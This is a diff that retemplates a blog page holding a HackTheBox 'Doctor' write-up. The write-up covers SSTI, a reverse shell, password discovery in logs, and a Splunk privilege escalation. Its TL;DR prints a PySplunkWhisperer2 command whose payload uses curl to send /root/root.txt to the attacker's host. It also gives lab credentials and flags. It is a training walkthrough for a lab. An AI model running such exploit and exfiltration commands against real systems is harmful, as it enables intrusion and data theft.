@@ -1,195 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-us">
 <head>
-  
-    <title>Doctor - HackTheBox Write-up :: The Red Bay</title>
-  
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Intro Greetings, here is my write-up for the doctor HackTheBox machine. I hope you enjoy the read! If you&amp;rsquo;re in a hurry, skip to the TL;DR section at the end.
-Doctor is considered an easy Linux box by HackTheBox standards. It&amp;rsquo;s a well rounded box because its solution is composed of a mix of basic enumeration, basic priviledge escalation and also some recent CVE exploitation that can be accomplished with off-the-shelf tools." />
-<meta name="keywords" content="" />
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="https://theredbay.net/infosec/htb/htb-doctor/" />
-
-
-
-
-<link rel="stylesheet" href="https://theredbay.net/assets/style.css">
-
-  <link rel="stylesheet" href="https://theredbay.net/assets/red.css">
-
-
-
-
-
-
-<link rel="apple-touch-icon" href="https://theredbay.net/img/apple-touch-icon-192x192.png">
-
-  <link rel="shortcut icon" href="https://theredbay.net/img/favicon/red.png">
-
-
-
-<meta name="twitter:card" content="summary" />
-
-  
-    <meta name="twitter:site" content="" />
-  
-    <meta name="twitter:creator" content="redbay" />
-
-
-
-<meta property="og:locale" content="en" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Doctor - HackTheBox Write-up">
-<meta property="og:description" content="Write-up for the &#39;Doctor&#39; box from HackTheBox.eu" />
-<meta property="og:url" content="https://theredbay.net/infosec/htb/htb-doctor/" />
-<meta property="og:site_name" content="The Red Bay" />
-
-  
-    <meta property="og:image" content="https://theredbay.net/img/favicon/red.png">
-  
-
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
-
-
-  <meta property="article:published_time" content="2020-11-23 00:25:37 -0500 EST" />
-
-
-
-
-
-
-
-
-
-
-
-
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Doctor</title>
+  <link rel="stylesheet" href="/css/style.css">
 </head>
-<body class="red">
+<body>
+  <div class="container">
+    <nav class="sidebar">
+			<h1>The Red Bay</h1>
 
+			<ul>
+	<a href="/">Home</a>
+	<a href="/projects/">Projects</a>
+	<a href="/infosec/">Infosec</a>
+	<a href="/infosec/htb/">Hack the Box</a>
+	<a href="/misc/">Misc</a>
+	<a href="/about/">About</a>
+</ul>
 
-<div class="container center headings--one-size">
+			<p class="copyright">Copyright 2025. All rights reserved.</p>
 
-  <header class="header">
-  <div class="header__inner">
-    <div class="header__logo">
-      <a href="/">
-  <div class="logo">
-    The Red Bay
-  </div>
-</a>
-
-    </div>
-    
-      <div class="menu-trigger">menu</div>
-    
-  </div>
+    </nav>
+    <main class="content">
+      
   
-    <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-      
-        <ul class="menu__sub-inner">
-          <li class="menu__sub-inner-more-trigger">Menu ▾</li>
-
-          <ul class="menu__sub-inner-more hidden">
-            
-              
-                <li><a href="/about">About</a></li>
-              
-            
-              
-                <li><a href="http://github.com/rebay1982">GitHub</a></li>
-              
-            
-              
-                <li><a href="/infosec">Infosec</a></li>
-              
-            
-              
-                <li><a href="/misc">Misc</a></li>
-              
-            
-          </ul>
-        </ul>
-      
-    
-
-    
-  </ul>
-
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="/about">About</a></li>
-      
-    
-      
-        <li><a href="http://github.com/rebay1982">GitHub</a></li>
-      
-    
-      
-        <li><a href="/infosec">Infosec</a></li>
-      
-    
-      
-        <li><a href="/misc">Misc</a></li>
-      
-    
-    
-  </ul>
-</nav>
-
   
-</header>
+	<h1>Doctor</h1>
+	<time datetime="2020-11-23T00:25:37-05:00">November 23, 2020</time>
 
-
-  <div class="content">
-    
-<div class="post">
-  <h1 class="post-title">
-    <a href="https://theredbay.net/infosec/htb/htb-doctor/">Doctor - HackTheBox Write-up</a></h1>
-  <div class="post-meta">
-    
-      <span class="post-date">
-        2020-11-23 
-      </span>
-    
-    
-    <span class="post-author">:: redbay</span>
-    
-  </div>
-
-  
-
-  
-
-  
-    <div class="table-of-contents">
-      <h2>
-        
-          Table of Contents
-        
-      </h2>
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#initial-recon">Initial Recon</a></li>
-    <li><a href="#foothold">Foothold</a></li>
-    <li><a href="#user">User</a></li>
-    <li><a href="#root">Root</a></li>
-    <li><a href="#conclusion">Conclusion</a></li>
-    <li><a href="#tldr">TL;DR</a></li>
-  </ul>
-</nav>
-    </div>
-  
-
-  <div class="post-content"><div>
-        <h1 id="intro">Intro<a href="#intro" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+  <h1 id="intro">Intro</h1>
 <p>Greetings, here is my write-up for the <code>doctor</code> HackTheBox machine. I hope you enjoy the read! If
 you&rsquo;re in a hurry, skip to the <a href="#tldr">TL;DR</a> section at the end.</p>
 <p><img src="/img/htb-doctor/infocard.png" alt=""></p>
@@ -201,8 +42,8 @@ A real head scratcher that reminds us that the solution is always right under ou
 either overthinking it or simply not seeing it.</p>
 <p>After solving <code>doctor</code>, we won&rsquo;t be able to help but notice the amount of clues the information card
 picture actually gives out! Alright, enough talking, let&rsquo;s get to work.</p>
-<h2 id="initial-recon">Initial Recon<a href="#initial-recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<h3 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h2 id="initial-recon">Initial Recon</h2>
+<h3 id="enumeration">Enumeration</h3>
 <p>First and foremost, as with any target we engage, we need to start by doing some basic enumeration
 and reconnaissance work because we can&rsquo;t engage a box without knowing what&rsquo;s running on it.  This
 basically means we need to run a port scan to get that information and this is accomplished by using
@@ -264,7 +105,7 @@ that could possibly lead to our foothold.</p>
 <a href="https://www.robotstxt.org/robotstxt.html">here</a> for more information. As for the <code>/services</code>
 folder, pointing our web browser to <code>10.10.10.209:8089/services</code> serves up an authentication
 prompt for which we do not have credentials yet. Let&rsquo;s take note of this and move on for now.</p>
-<h3 id="web-surfing">Web Surfing<a href="#web-surfing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="web-surfing">Web Surfing</h3>
 <p>With basic enumeration done, let&rsquo;s engage the machine. Visiting the hosted static site through a
 web browser doesn&rsquo;t bring up much: a simple, static site where every page is the same.</p>
 <p><img src="/img/htb-doctor/static.png" alt=""></p>
@@ -337,8 +178,8 @@ request to know which site to serve up to the client. Apache has
 <p><img src="/img/htb-doctor/login.png" alt=""></p>
 <p>And there you have it, we stumbled upon a login screen to a portal where we can create an account
 and post messages &ndash; user input. Let&rsquo;s create an account and see where this leads us to.</p>
-<h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<h3 id="attack-vector">Attack Vector<a href="#attack-vector" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h2 id="foothold">Foothold</h2>
+<h3 id="attack-vector">Attack Vector</h3>
 <p>Next on the list is finding our primary attack vector.  After creating an account on the login
 screen, we enter a forum where you can post messages with a title and a body. This is nothing
 special but it looks templated. Hopefully we can take advantage of that.</p>
@@ -421,7 +262,7 @@ user, who belongs to the <code>web</code> and <code>adm</code> groups.</p>
 <p>We&rsquo;re making good progress here and the next step is to try to acquire a
 <a href="https://hackernoon.com/reverse-shell-cf154dfee6bd">reverse shell</a>.  Following that, we can start
 the process of moving out of our low privileged user (<code>web</code> in this case).</p>
-<h3 id="reverse-shell">Reverse Shell<a href="#reverse-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="reverse-shell">Reverse Shell</h3>
 <p>Using the SSTI method outlined above, we can now try our hand at a reverse shell. Starting with <code>nc</code>
 (<a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>) and using the most common method, I couldn&rsquo;t obtain
 successful results. Here&rsquo;s what the payload would have looked like</p>
@@ -469,8 +310,8 @@ $
 fashion compared to injecting every single command we want to execute and browsing to the <code>/archive</code>
 endpoint. We also learned that there are work arounds to not being able to execute commands using
 netcat on the remote machine. Let&rsquo;s go catch that user flag!</p>
-<h2 id="user">User<a href="#user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<h3 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h2 id="user">User</h2>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
 <p>Now that we have a shell, let&rsquo;s go snooping around to find a way to elevate our privileges and get
 the user flag. We will be engaging in some basic recon work and some looking around. One good
 first step would be to find out who the target user is.</p>
@@ -531,7 +372,7 @@ have pulled up the same log as we did with our <code>grep</code> command. We wou
 the log and identify that line.</p>
 <p>Understanding what we&rsquo;re doing and what we&rsquo;re looking for has a lot more value in this case than
 trying to use tools that will do the work for us.</p>
-<h2 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="root">Root</h2>
 <p>Now that we have the user flag, let&rsquo;s see about root.  From the initial <a href="#enumeration">recon</a>, we
 know this box is running Splunk on port <code>8089</code>.  Let&rsquo;s go have a look by pointing our browswer
 to <code>doctors.htb:8089/</code></p>
@@ -582,7 +423,7 @@ fe46f36187c9299663d023c7f9bd1d74
 --------------------------1e3af6b22be334f1--
 </code></pre><p>And there you have it. The contents of <code>/root/root.txt</code> have been gracefully sent to us through
 netcat. We now have the root flag and all that we need to solve for this box.</p>
-<h2 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="conclusion">Conclusion</h2>
 <p>This box was pretty challenging for an easy one &ndash; especially for the foothold. Finding the portal,
 the <code>/archive</code> endpoint where the actual SSTI is happening, getting the reverse shell and finding
 the password (needle in a haystack) were the most time consuming parts of this machine. The
@@ -596,8 +437,8 @@ it. Special thanks go to my brother for his help with the review process of this
 <ul>
 <li>redbay</li>
 </ul>
-<h2 id="tldr">TL;DR<a href="#tldr" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<h3 id="foothold-1">Foothold<a href="#foothold-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h2 id="tldr">TL;DR</h2>
+<h3 id="foothold-1">Foothold</h3>
 <ol>
 <li>Put <code>10.10.10.209 doctors.htb</code> in your <code>/etc/hosts</code> file and use <code>doctors.htb</code> to access the HTTP
 server on the machine.</li>
@@ -609,12 +450,12 @@ replace <code>&lt;ip&gt;</code> with your machine&rsquo;s IP address on the Hack
 <li>From your reverse shell, <code>grep -r -i 'reset_password' /var/log</code></li>
 <li>Find the <code>Guitar123</code> password from the logs.</li>
 </ol>
-<h3 id="user-1">User<a href="#user-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="user-1">User</h3>
 <ol>
 <li><code>su shaun</code> and use the <code>Guitar123</code> password when prompted.</li>
 <li><code>cat /home/shaun/user.txt</code> -&gt; <code>7dfec0e6330b1ec2b10db9728217fb7e</code></li>
 </ol>
-<h3 id="root-1">Root<a href="#root-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="root-1">Root</h3>
 <ol>
 <li>Use <a href="https://github.com/cnotin/SplunkWhisperer2">PySplunkWhisperer2</a> to exploit Splunk 8.0.5 and use Shaun&rsquo;s credentials (<code>shaun/Guitar123</code>)
 <code>python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password &quot;Guitar123&quot; --payload &quot;curl -F 'data=@/root/root.txt' http://&lt;your IP&gt;:4545&quot; --lhost &lt;your IP&gt;</code></li>
@@ -622,41 +463,10 @@ replace <code>&lt;ip&gt;</code> with your machine&rsquo;s IP address on the Hack
 <li>Wait and get root flag -&gt; <code>fe46f36187c9299663d023c7f9bd1d74</code></li>
 </ol>
 
-      </div></div>
+  <p class="copyright">Copyright 2025. All rights reserved.</p>
 
-  
 
-  
-
-</div>
-
+    </main>
   </div>
-
-  
-    <footer class="footer">
-  <div class="footer__inner">
-    
-      <div class="copyright copyright--user">
-        <span>Reda Baydoun</span>
-    
-        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
-      </div>
-  </div>
-</footer>
-
-<script src="https://theredbay.net/assets/main.js"></script>
-<script src="https://theredbay.net/assets/prism.js"></script>
-
-
-  <script src="https://theredbay.net/assets/languageSelector.js"></script>
-
-
-
-
-
-
-  
-</div>
-
 </body>
 </html>
